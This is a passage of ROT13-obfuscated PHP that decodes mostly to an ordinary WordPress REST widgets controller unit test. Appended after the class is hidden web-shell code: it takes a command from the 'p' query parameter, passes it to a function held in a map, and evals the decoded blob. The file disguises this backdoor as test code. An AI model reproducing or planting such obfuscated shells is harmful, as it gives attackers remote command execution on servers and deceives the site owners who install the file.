		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'erdhrfgf' => neenl(
					neenl(
						'zrgubq' => 'QRYRGR',
						'cngu'   => '/jc/i2/jvqtrgf/grkg-2?sbepr=1',
					),
					neenl(
						'zrgubq' => 'QRYRGR',
						'cngu'   => '/jc/i2/jvqtrgf/grkg-3?sbepr=1',
					),
					neenl(
						'zrgubq' => 'QRYRGR',
						'cngu'   => '/jc/i2/jvqtrgf/grkg-4?sbepr=1',
					),
				),
			)
		);
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregFnzr(
			neenl(
				'fvqrone-1' => neenl(),
			),
			jc_trg_fvqronef_jvqtrgf()
		);
		$guvf->nffregFnzr(
			neenl(
				'_zhygvjvqtrg' => 1,
			),
			trg_bcgvba( 'jvqtrg_grkg' )
		);
	}

	/**
	 * Gur cercner_vgrz() zrgubq qbrf abg rkvfg sbe fvqrone.
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag cercner_vgrz().
	}

	/**
	 * @gvpxrg 41683
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/jvqtrgf' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];

		$guvf->nffregFnzr( neenl( 'i1' => gehr ), $qngn['raqcbvagf'][0]['nyybj_ongpu'] );

		$guvf->nffregPbhag( 7, $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'vq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'vq_onfr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fvqrone', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'eraqrerq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'eraqrerq_sbez', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'vafgnapr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'sbez_qngn', $cebcregvrf );
	}

	/**
	 * Urycre gb erzbir yvaxf xrl.
	 *
	 * @cnenz neenl $qngn Neenl bs qngn.
	 *
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba erzbir_yvaxf( $qngn ) {
		vs ( ! vf_neenl( $qngn ) ) {
			erghea $qngn;
		}
		$pbhag = 0;
		sbernpu ( $qngn nf $vgrz ) {
			vs ( vf_neenl( $vgrz ) && vffrg( $vgrz['_yvaxf'] ) ) {
				hafrg( $qngn[ $pbhag ]['_yvaxf'] );
			}
			++$pbhag;
		}

		erghea $qngn;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>